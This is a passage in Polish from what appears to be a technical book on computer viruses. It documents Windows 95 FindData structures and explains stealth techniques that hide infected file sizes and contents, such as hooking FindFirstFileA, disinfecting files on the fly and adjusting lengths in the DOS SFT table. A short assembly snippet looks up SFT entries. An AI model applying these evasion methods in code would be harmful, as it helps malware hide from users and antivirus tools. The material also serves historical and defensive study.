\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}11-14}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}zarezerwowane}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}15}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}atrybut znalezionej pozycji katalogu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16-17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}czas ostatniej modyfikacji znalezionej pozycji katalogu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18-19}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}data ostatniej modyfikacji znalezionej pozycji katalogu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1A-1D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 znalezionej pozycji katalogu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1E-2A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}nazwa i rozszerzenie pliku}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1.3. Programy wykorzystuj\uc1\u261\'b9ce d\uc1\u322\'b3ugie nazwy plik\'f3w (Windows 95) oraz polecenie DIR wywo\uc1\u322\'b3ywane z poziomu okna Tryb MS-D}{\f1\fs24\b\lang1045{\*\listtag0}OS}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wraz z pojawieniem si\uc1\u281\'ea systemu Windows 95 wprowadzono tzw. D\uc1\u322\'b3ugie nazwy plik\'f3w, kt\'f3rymi zast\uc1\u261\'b9piono dotychczas u\uc1\u380\'bfywane (jedenastoznakowe). Mechanizm obslugi d\uc1\u322\'b3ugich nazw plik\'f3w jest dost\uc1\u281\'eapny wy\uc1\u322\'b3\uc1\u261\'b9cznie wtedy, gdy aktywny jest system Windows oraz gdy zainstalowany jest tzw. Mened\uc1\u380\'bfer IFS.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Za obs\uc1\u322\'b3ug\uc1\u281\'ea d\uc1\u322\'b3ugich nazw plik\'f3w odpowiedzialna jest w systemie DOS funkcja (71??/21), gdzie ?? oznacza numer podfunkcji przekazywanej w rejestrze AL. Za pomoc\uc1\u261\'b9 takich podfunkcji zdublowano funkcje (z dok\uc1\u322\'b3adno\uc1\u347\'9cci\uc1\u261\'b9 do numer\'f3w) operuj\uc1\u261\'b9ce na plikach, a dost\uc1\u281\'eapne we wcze\uc1\u347\'9cniejszych wersjach systemu DOS. Za przeszukiwanie zawarto\uc1\u347\'9cci katalogu s\uc1\u261\'b9 wi\uc1\u281\'eac odpowiedzialne dwie podfunkcje (714E,714F/21), operuj\uc1\u261\'b9ce na wprowadzonej wraz z systemem Windows 95strukturze o nazwie FindData. Opisan}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} funkcje s\uc1\u261\'b9 wykorzystywane m.in. przez polecenie DIR wywo\uc1\u322\'b3ywane w oknie Tryb MS-DOS (w systemie Windows 95).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby umo\uc1\u380\'bfliwi\uc1\u263\'e6 r\'f3\uc1\u380\'bfnym aplikacjom dzia\uc1\u322\'b3aj\uc1\u261\'b9cym w 32-bitowym \uc1\u347\'9crodowisku graficznym obs\uc1\u322\'b3ug\uc1\u281\'ea d\uc1\u322\'b3ugich nazw plik\'f3w, ale bez konieczno\uc1\u347\'9cci odwo\uc1\u322\'b3ywania si\uc1\u281\'ea do funkcji 16-bitowego systemu DOS, Windows 95 udost\uc1\u281\'eapnia analogicznie dzia\uc1\u322\'b3aj\uc1\u261\'b9ce funkcje poprzez tzw. API (ang. Application Program Interface), odpowiednik przerwania 21h dla systemu DOS.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod wi\uc1\u281\'eakszo\uc1\u347\'9cci funkcji systemowych dost\uc1\u281\'eapnych przez API zawarty jest w pliku KERNEL32.DLL, b\uc1\u281\'ead\uc1\u261\'b9cym cz\uc1\u281\'ea\uc1\u347\'9cci\uc1\u261\'b9 j\uc1\u261\'b9dra systemu. Na przyk\uc1\u322\'b3ad funkcji 714E odpowiada  funkcja FindFirstFileA, za\uc1\u347\'9c funkcji 714F - funkcja FindNextFileA. Z funkcji tych korzysta wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 program\'f3w dzia\uc1\u322\'b3aj\uc1\u261\'b9cych w systemie Win}{\f1\fs24\lang1045{\*\listtag0}d}{\f0\fs24\lang1045{\*\listtag0}ows 95, m.in. Explorator, a tak\uc1\u380\'bfe r\'f3\uc1\u380\'bfne programy nak\uc1\u322\'b3adkowe, np. Wondows Commander 95, tak wi\uc1\u281\'eac ich przej\uc1\u281\'eacie pozwala na u\uc1\u380\'bfycie techniki stealth r\'f3wnie\uc1\u380\'bf w systemie Windows 95 (na razie nie ma wirusa kt\'f3ry potrafi\uc1\u322\'b3by to robi\uc1\u263\'e6). Adresy do powy\uc1\u380\'bfszych funkcji}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}mo\uc1\u380\'bfna odczyta\uc1\u263\'e6 z pliku KERNEL32.DLL (jest to nowy EXE typu PE), a uzyskane w ten spos\'f3b offsety nale\uc1\u380\'bfy zmodyfikowa\uc1\u263\'e6 poprzez dodanie do ich adresu, pod kt\'f3rym znajduje si\uc1\u281\'ea KERNEL32.DLL w pami\uc1\u281\'eaci. Niestety do dzisiaj nie jest znany mechanizm pozwalaj\uc1\u261\'b9cy na }{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}dczytanie tego adresu w spos\'f3b bezpo\uc1\u347\'9credni, bez u\uc1\u380\'bfywania funkcji API. Pierwszy wirus dla Windows 95 (Bizatch lub inaczej Boza) korzysta przy dost\uc1\u281\'eapie do funkcji systemowych ze sta\uc1\u322\'b3ego adresu, zapami\uc1\u281\'eatanego w wirusie. Ze wzgl\uc1\u281\'eadu na to, \uc1\u380\'bfe i\uc1\u380\'bf adres ten zmie}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ia si\uc1\u281\'ea w r\'f3\uc1\u380\'bfnych podwersjach systemu Windows 95, nale\uc1\u380\'bfy przed jego u\uc1\u380\'bfyciem sprawdzi\uc1\u263\'e6, czy rzeczywi\uc1\u347\'9ccie jest on w\uc1\u322\'b3a\uc1\u347\'9cciwy.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Opis struktury FindData zamieszczono poni\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura FindData}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.8154in/5.7731in/; table-sdh:89830b0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}atrybuty pliku}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bity 0-6 standardowe atrybuty plik\'f3w DOS}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bit 8 plik tymczasowy (temporary)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04-0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}czas i data utworzenia pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0C-13}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}czas i data ostatniego dost\uc1\u281\'eapu do pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}14-1B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}czas i data ostatniej modyfikacji pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1C-1F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku (bardziej znacz\uc1\u261\'b9ce 32 bity)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}20-23}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku (mniej znacz\uc1\u261\'b9ce 32 bity)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}24-2B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}zarezerwowane}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2C-12F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}260-bajtowe pole pe\uc1\u322\'b3nej nazwy pliku (jako ASCIIZ)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}130-13D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}14-bajtowe pole kr\'f3tkiej nazwy pliku (jako ASCIZZ)}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.2. Podawanie oryginalnych d\uc1\u322\'b3ugo\uc1\u347\'9cci i zawarto\uc1\u347\'9cci plik\'f3w (ang.}{\f1\fs24\i\b\lang1045{\*\listtag0}full stealth}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby w pe\uc1\u322\'b3ni oszukiwa\uc1\u263\'e6 system, nale\uc1\u380\'bfy opr\'f3cz prawdziwych d\uc1\u322\'b3ugo\uc1\u347\'9cci plik\'f3w podawa\uc1\u263\'e6 tak\uc1\u380\'bfe ich prawdziw\uc1\u261\'b9 zawarto\uc1\u347\'9c\uc1\u263\'e6. W tym celu opr\'f3cz funkcji przeszukuj\uc1\u261\'b9cych zawarto\uc1\u347\'9c\uc1\u263\'e6 katalogu trzeba przej\uc1\u261\'b9\uc1\u263\'e6 funkcje s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9ce do manipulowania zawarto\uc1\u347\'9cci\uc1\u261\'b9 plik\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najpro\uc1\u347\'9cciej w momencie otwierania pliku leczy\uc1\u263\'e6 go, a w chwili zamykania - ponownie infekowa\uc1\u263\'e6. Powy\uc1\u380\'bfsza metoda ma jednak kilka niedoci\uc1\u261\'b9gni\uc1\u281\'ea\uc1\u263\'e6. G\uc1\u322\'b3\'f3wn\uc1\u261\'b9 jej wad\uc1\u261\'b9 jest to, i\uc1\u380\'bf nie sprawdzi si\uc1\u281\'ea ona na pewno na dyskach zabezpieczonych przed zapisem (klasycznym przyk\uc1\u322\'b3adem jest tu }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}\uc1\u322\'b3yta CD lub zabezpieczona przed zapisem dyskietka). Nale\uc1\u380\'bfy te\uc1\u380\'bf pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf u\uc1\u380\'bfytkownik z pewno\uc1\u347\'9cci\uc1\u261\'b9 zauwa\uc1\u380\'bfy cz\uc1\u281\'easte leczenie i ponown\uc1\u261\'b9 infekcj\uc1\u281\'ea plik\'f3w, gdy\uc1\u380\'bf wszelkie operacje dyskowe b\uc1\u281\'ead\uc1\u261\'b9 przeb\uc1\u322\'b3aga\uc1\u322\'b3y wolniej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfszych wad nie posiada natomiast metoda polegaj\uc1\u261\'b9ca na tym, aby w momencie odczytu dowolnego pliku sprawdza\uc1\u263\'e6, czy jest to plik zainfekowany i w locie leczy\uc1\u263\'e6 go w pami\uc1\u281\'eaci, nie zmieniaj\uc1\u261\'b9c jednak jego obrazu na dysku. W efekcie program odczytuj\uc1\u261\'b9cy plik widzi jego oryginaln\uc1\u261\'b9 zawarto\uc1\u347\'9c\uc1\u263\'e6, za\uc1\u347\'9c fizycznie plik}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}nie jest zmieniany. Napisanie procedury stosuj\uc1\u261\'b9cej powy\uc1\u380\'bfsz\uc1\u261\'b9 metod\uc1\u281\'ea nie jest ju\uc1\u380\'bf jednak zadaniem tak \uc1\u322\'b3atwym, jak w poprzednim przypadku; nale\uc1\u380\'bfy rozwa\uc1\u380\'bfy\uc1\u263\'e6 kilka mo\uc1\u380\'bfliwo\uc1\u347\'9cci zwi\uc1\u261\'b9zanych z po\uc1\u322\'b3o\uc1\u380\'bfeniem wska\uc1\u378\'9fnika zapisu/odczytu w stosunku do pocz\uc1\u261\'b9tku pliku. Aby upr}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}\uc1\u347\'9cci\uc1\u263\'e6 to zadanie, cz\uc1\u281\'easto stosuje si\uc1\u281\'ea zabieg polegaj\uc1\u261\'b9cy na tym, \uc1\u380\'bfe przy otwieraniu zainfekowanego pliku zmniejsza si\uc1\u281\'ea w wewn\uc1\u281\'eatrznych strukturach DOS (tablica SFT, opisana poni\uc1\u380\'bfej) jego d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 o rozmiar wirusa. Wtedy, jedynym obszarem pliku, kt\'f3rym musi zaj\uc1\u261\'b9\uc1\u263\'e6 si\uc1\u281\'ea wirus, jest jego pocz\uc1\u261\'b9tek (np. w przypadku nag\uc1\u322\'b3\'f3wka plik\'f3w EXE wirus powinien przywraca\uc1\u263\'e6 jego prawdziw\uc1\u261\'b9 zawarto\uc1\u347\'9c\uc1\u263\'e6), gdy\uc1\u380\'bf operacje odczytu nigdy nie dojd\uc1\u261\'b9 do dodanego na ko\uc1\u324\'f1cu pliku wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przy programowaniu wirusa wykorzystuj\uc1\u261\'b9cego technik\uc1\u281\'ea stealth cz\uc1\u281\'easto przydatne s\uc1\u261\'b9 dwie wewn\uc1\u281\'eatrzne funkcje DOS (1216/1220/2F), s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9ce do operowania na wewn\uc1\u281\'eatrznych strukturach DOS, tzw. tablicach SFT (ang. System File Table), zawieraj\uc1\u261\'b9cych wszelkie informacje o otwartym pliku. W systemie mo\uc1\u380\'bfe istnie\uc1\u263\'e6 kilka podtablic }{\f1\fs24\lang1045{\*\listtag0}S}{\f0\fs24\lang1045{\*\listtag0}FT, po\uc1\u322\'b3\uc1\u261\'b9czonych w \uc1\u322\'b3a\uc1\u324\'f1cuch. Dost\uc1\u281\'eap do zawartych w nich informacji o pliku uzyskuje si\uc1\u281\'ea na podstawie uchwytu pliku zwracanego przez funkcje (3D,6C/21) przy jego otwieraniu. Uchwyt ten podaje si\uc1\u281\'ea jako parametr funkcji (1216/1220/2F). Po ich u\uc1\u380\'bfyciu najpierw u}{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}yskujemy adres tzw. tablicy JFT (ang. Job File Table), opisuj\uc1\u261\'b9cej pliki otwarte w danym procesie. Na jej podstawie otrzymujemy adres tablicy SFT opisuj\uc1\u261\'b9cej dany plik. U\uc1\u380\'bfywa si\uc1\u281\'ea do tego poni\uc1\u380\'bfszej sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Uzyskiwanie informacji o pliku na podstawie jego uchwytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,1220h            ; we\uc1\u378\'9f adres tablicy JFT zawieraj\uc1\u261\'b9cej numer SFT,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                         ; opisuj\uc1\u261\'b9cej plik podany w BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,UchwytPliku      ; BX zawiera uchwyt (numer) pliku }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                 ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BL,ES:[DI]          ; we\uc1\u378\'9f numer tablicy SFT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,1216h            ; we\uc1\u378\'9f adres tablicy SFT na podstawie numeru w BL }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                 ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea ES:DI wskazuje na tablic\uc1\u281\'ea SFT pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
